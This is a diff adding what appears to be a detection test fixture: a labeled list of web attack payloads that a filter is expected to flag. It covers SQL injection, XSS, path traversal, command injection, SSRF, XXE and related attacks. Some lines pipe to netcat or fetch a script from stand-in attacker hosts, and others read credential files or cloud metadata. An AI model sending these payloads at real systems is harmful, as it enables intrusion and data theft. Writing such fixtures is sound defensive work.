@@ -1,0 +1,59 @@
+# Attack payloads. Every line should be flagged; each one that passes counts
+# as a miss. Format: category<TAB>location<TAB>input
+# Locations: query (raw query string), body, path, header (User-Agent).
+SQLi	query	id=1' OR '1'='1
+SQLi	query	id=1 UNION SELECT username, password FROM users
+SQLi	query	id=1; DROP TABLE users
+SQLi	query	id=1 AND 1=1
+SQLi	query	id=1 OR 1=1--
+SQLi	query	id=1 AND sleep(5)
+SQLi	query	id=1; WAITFOR DELAY '0:0:5'
+SQLi	query	id=1 AND benchmark(1000000,md5(1))
+SQLi	query	id=1 UNION/**/SELECT password FROM users
+SQLi	query	id=0x61646d696e
+SQLi	query	id=1; exec xp_cmdshell 'dir'
+SQLi	body	{"username":"admin' OR '1'='1' --","password":"x"}
+SQLi	query	id=1%2527%20OR%20%25271%2527%3D%25271
+SQLi	query	id=1%20UNION%2520SELECT%2520password
+SQLi	query	id=1%2527%20OR%20%25271%2527%3D%25271%20100%25
+SQLi	query	id=1/*!50000UNION*/+SELECT+1
+SQLi	body	username=admin%27+OR+%271%27%3D%271&password=x
+SQLi	body	q=1%27%20UNION%20SELECT%20password%20FROM%20users
+XSS	query	q=<script>alert(1)</script>
+XSS	query	q=<img src=x onerror=alert(1)>
+XSS	query	q=<svg onload=alert(1)>
+XSS	query	next=javascript:alert(document.cookie)
+XSS	query	q=%3Cscript%3Ealert(1)%3C/script%3E
+XSS	query	q=%253Cscript%253Ealert(1)
+XSS	body	{"comment":"<iframe src=\"https://evil.example\"></iframe>"}
+XSS	header	<script>alert(1)</script>
+XSS	query	q=&lt;script&gt;alert(1)
+PathTraversal	path	/static/../../../etc/passwd
+PathTraversal	query	file=../../../../etc/passwd
+PathTraversal	query	file=%2e%2e%2f%2e%2e%2fetc%2fpasswd
+PathTraversal	query	file=%252e%252e%252fetc%252fpasswd
+PathTraversal	query	file=..%2f..%2fetc%2fshadow
+PathTraversal	path	/download/%2E%2E%2Fetc%2Fpasswd
+CommandInjection	query	host=8.8.8.8; cat /etc/passwd
+CommandInjection	query	host=8.8.8.8 | nc attacker.example 4444
+CommandInjection	query	name=$(whoami)
+CommandInjection	query	name=`id`
+CommandInjection	body	{"cmd":"; wget http://evil.example/x.sh"}
+CommandInjection	query	host=8.8.8.8%3B%20cat%20%2Fetc%2Fpasswd
+SSRF	query	url=http://169.254.169.254/latest/meta-data/
+SSRF	query	url=http://localhost:6379/
+SSRF	query	url=http://127.0.0.1:8080/admin
+SSRF	query	url=file:///etc/passwd
+SSRF	query	url=gopher://127.0.0.1:11211/
+SSRF	body	{"webhook":"http://10.0.0.5/internal"}
+XXE	body	<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+XXE	body	<!DOCTYPE x [<!ENTITY % remote SYSTEM "http://evil.example/x.dtd"> %remote;]>
+LFI	query	page=/proc/self/environ
+LFI	query	page=../../../../windows/system32/drivers/etc/hosts
+LFI	query	config=.env
+OpenRedirect	query	next=//evil.example
+OpenRedirect	query	redirect=https://evil.example/login
+OpenRedirect	query	return=https://evil.example
+PrototypePollution	query	__proto__[isAdmin]=true
+PrototypePollution	body	{"constructor":{"prototype":{"isAdmin":true}}}
+PrototypePollution	query	a[constructor][prototype][admin]=1
